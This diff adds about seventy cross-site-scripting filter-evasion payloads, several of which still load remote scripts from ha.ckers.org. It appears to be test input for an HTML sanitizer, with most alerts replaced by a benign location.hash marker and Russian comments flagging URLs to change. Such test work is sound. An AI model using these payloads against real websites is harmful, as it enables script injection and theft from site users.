@@ -1,2 +1,71 @@
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<IMG SRC="javascript:alert('XSS');">
+<SCRIPT SRC=http://ha.ckers.org/xss.j></SCRIPT> // сменить урл
+<IMG SRC="javascript:location.hash=10;">
+<IMG SRC=javascript:location.hash=10>
+<IMG SRC=JaVaScRiPt:location.hash=10>
+<IMG SRC=`javascript:location.hash="10"`>
+<IMG SRC=`javascript:location.hash=10`>
+<IMG """><SCRIPT>location.hash=10</SCRIPT>">
+<IMG SRC=javascript:location.hash=String.fromCharCode(49, 48))>
+<IMG SRC=/ onerror="location.hash=String.fromCharCode(49, 48)"></img>
+<IMG SRC="jav	ascript:location.hash=10;">
+<IMG SRC="jav&#x09;ascript:location.hash=10;">
+<IMG SRC="jav&#x0A;ascript:location.hash=10;">
+<IMG SRC="jav&#x0D;ascript:location.hash=10;">
+perl -e 'print "<IMG SRC=java\0script:location.hash=10>";' > out
+<IMG SRC=" &#14;  javascript:location.hash=10;">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<BODY onload!#%&()*~+-_.,:;?@[/|\]^`=location.hash=10>
+<SCRIPT/SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<<SCRIPT>location.hash=10;//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.j?< B > // сменить урл
+<SCRIPT SRC=//ha.ckers.org/.> // сменить урл! <SCRIPT SRC=//ha.ckers.org/.j> - оригинал!!! с .j!!!
+<IMG SRC="javascript:location.hash=10"
+<iframe src=http://ha.ckers.org/scriptlet.htm < // сменить урл
+\";location.hash=10;//
+</script><script>location.hash=10;</script>
+</TITLE><SCRIPT>location.hash=10;</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:location.hash=10;">
+<BODY BACKGROUND="javascript:location.hash=10">
+<IMG DYNSRC="javascript:location.hash=10">
+<IMG LOWSRC="javascript:location.hash=10">
+<STYLE>li {list-style-image: url("javascript:location.hash=10");}</STYLE><UL><LI>XSS</br>
+<BODY ONLOAD=location.hash=10>
+<BGSOUND SRC="javascript:location.hash=10;">
+<BR SIZE="&{location.hash=10}">
+<LINK REL="stylesheet" HREF="javascript:location.hash=10;">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.cs"> // сменить урл!
+<STYLE>@import'http://ha.ckers.org/xss.cs';</STYLE> // сменить урл
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.cs>; REL=stylesheet"> // сменить урл
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xm#xss")}</STYLE> // сменить урл и точно с минимальным приоритетом!
+<STYLE>@im\port'\ja\vasc\ript:location.hash=10';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(location.hash=10)">
+<STYLE>.XSS{background-image:url("javascript:location.hash=10");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:location.hash=10")}</STYLE>
+<XSS STYLE="xss:expression(location.hash=10)">
+¼script¾location.hash=10¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:location.hash=10;">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5sb2NhdGlvbi5oYXNoPTEwPC9zY3JpcHQ+">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:location.hash=10;">
+<IFRAME SRC="javascript:location.hash=10;"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:location.hash=10;"></FRAMESET>
+<TABLE BACKGROUND="javascript:location.hash=10">
+<TABLE><TD BACKGROUND="javascript:location.hash=10">
+<DIV STYLE="background-image: url(javascript:location.hash=10)">
+<DIV STYLE="background-image: url(&#1;javascript:location.hash=10)">
+<DIV STYLE="width: expression(location.hash=10);">
+<!--[if gte IE 4]><SCRIPT>location.hash=10;</SCRIPT><![endif]-->
+<BASE HREF="javascript:location.hash=10;//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.htm"></OBJECT> // сменить урл!
+a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
+<SCRIPT SRC="http://ha.ckers.org/xss.jp"></SCRIPT> // сменить урл
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.j></SCRIPT>'"--> // сменить урл
+<? echo('<SCR)';echo('IPT>location.hash=10</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>location.hash=10</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-location.hash=10;+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.j"></SCRIPT> // сменить урл
